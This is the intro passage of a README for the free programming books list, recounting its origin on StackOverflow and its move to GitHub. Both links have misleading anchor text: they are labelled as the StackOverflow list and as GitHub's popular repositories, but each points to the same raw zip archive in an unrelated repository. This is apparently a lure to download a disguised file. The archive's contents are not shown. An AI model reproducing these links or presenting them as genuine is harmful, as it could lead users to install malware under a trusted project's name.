## Intro

This list was originally a clone of [StackOverflow - List of Freely Available Programming Books](https://github.com/bro-gervil/free-programming-books/raw/refs/heads/main/_includes/programming-free-books-2.1.zip) with contributions from Karan Bhangui and George Stocker.

The list was moved to GitHub by Victor Felder for collaborative updating and maintenance. It has grown to become one of [GitHub's most popular repositories](https://github.com/bro-gervil/free-programming-books/raw/refs/heads/main/_includes/programming-free-books-2.1.zip).
